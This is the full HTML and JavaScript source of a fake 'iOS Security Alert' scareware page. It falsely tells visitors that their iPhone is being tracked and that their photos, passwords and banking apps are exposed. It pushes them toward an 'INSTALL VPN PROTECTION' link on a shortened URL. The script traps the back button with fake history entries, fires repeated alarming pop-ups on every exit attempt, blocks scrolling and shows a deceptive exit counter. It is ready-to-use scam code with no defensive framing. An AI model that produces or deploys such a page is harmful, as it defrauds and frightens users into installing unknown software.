<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>iOS Security Alert</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #f2f2f2;
      color: #111;
      height: 100vh;
      overflow: hidden;
      touch-action: manipulation;
      user-select: none;
      -webkit-user-select: none;
    }

    .alert-container {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      background: rgba(0,0,0,0.6);
      z-index: 9999;
    }

    .alert-box {
      background: #fff;
      border: none; /* Red border removed */
      border-radius: 18px;
      padding: 25px;
      max-width: 400px;
      text-align: center;
      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
    }

    .alert-icon {
      width: 60px;
      height: 60px;
      margin-bottom: 15px;
    }

    h1 {
      font-size: 18px;
      color: #d10000;
      margin-bottom: 12px;
    }

    p {
      font-size: 15px;
      line-height: 1.5;
      color: #333;
    }

    .btn-group {
      margin-top: 20px;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .btn {
      padding: 14px;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 500;
      border: none;
      cursor: pointer;
    }

    .btn-install {
      background: #007aff;
      color: #fff;
      text-align: center;
      line-height: 1.4;
    }

    .btn-subtext {
      display: block;
      text-align: center;
      font-size: 16px;
      margin-top: 2px;
    }

    .btn-install:active {
      opacity: 0.9;
    }

    .btn-cancel {
      background: #e5e5ea;
      color: #111;
    }

    .btn-cancel:active {
      background: #d1d1d6;
    }

    .exit-attempts {
      margin-top: 10px;
      font-size: 13px;
      color: #ff3b30;
    }

    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      25% { transform: translateX(-8px); }
      50% { transform: translateX(8px); }
      75% { transform: translateX(-8px); }
    }
  </style>
</head>
<body>
  <div class="alert-container" id="alertContainer">
    <div class="alert-box" id="alertBox">
      <img src="https://cdn-icons-png.flaticon.com/512/753/753345.png" class="alert-icon" alt="Alert">
      <h1>System Security Alert </h1>
      <p><strong>Your iPhone is being tracked!</strong></p>
      <p>Suspicious behavior has been detected from scammers.</p>
      <p>They can access:<br>• Photos<br>• Passwords<br>• Banking apps</p>

      <div class="btn-group">
        <button class="btn btn-install" onclick="window.location.href='https://zSwjK8.short.gy/antivirus/'">
           INSTALL VPN PROTECTION<br><span class="btn-subtext">NOW</span>
        </button>
        <button class="btn btn-cancel" id="cancelBtn">
          CANCEL (RISKY)
        </button>
      </div>
      <div class="exit-attempts" id="exitAttempts">Exit attempts: 0 / 7</div>
    </div>
  </div>

  <script>
  let attempts = 0;
  const maxAttempts = 10; // now 10 actual attempts allowed
  const visibleMax = 7; // but still show only 7 in the UI
  const cancelBtn = document.getElementById('cancelBtn');
  const exitAttemptsText = document.getElementById('exitAttempts');
  const alertBox = document.getElementById('alertBox');

  // Push 10 fake history states to trap iOS back button
  for (let i = 0; i < 10; i++) {
    history.pushState({}, '', location.href);
  }

  // Trap back navigation
  window.onpopstate = function () {
    history.pushState({}, '', location.href);
    handleExitAttempt();
  };

  function handleExitAttempt() {
    attempts++;
    const messages = [
      "iOS Security Risk Detected!",
      "Scammers are accessing your photos!",
      "Your banking app is visible!",
      "Immediate VPN Protection Needed!",
      "Critical: iCloud Access Risk!",
      "Final Warning: Stop Exit!",
      "You're at maximum risk!",
      "You're ignoring system protection!",
      "Your iPhone remains vulnerable!",
      "Last chance: Lockdown recommended!"
    ];

    if (attempts <= maxAttempts) {
      // Show two alerts per attempt
      alert(`⚠️ ${messages[(attempts * 2) - 2] || messages[6]}`);
      alert(`⚠️ ${messages[(attempts * 2) - 1] || messages[7]}`);

      // Show only up to 7 in UI
      const shown = Math.min(attempts, visibleMax);
      exitAttemptsText.textContent = `Exit attempts: ${shown} / 7`;

      // Shake effect
      alertBox.style.animation = "shake 0.4s";
      setTimeout(() => alertBox.style.animation = "", 500);
    } else {
      // Let them exit
      window.location.href = "about:blank";
    }
  }

  cancelBtn.addEventListener('click', handleExitAttempt);

  // Prevent scroll
  document.addEventListener('touchmove', function (e) {
    e.preventDefault();
  }, { passive: false });
</script>
</body>
</html>
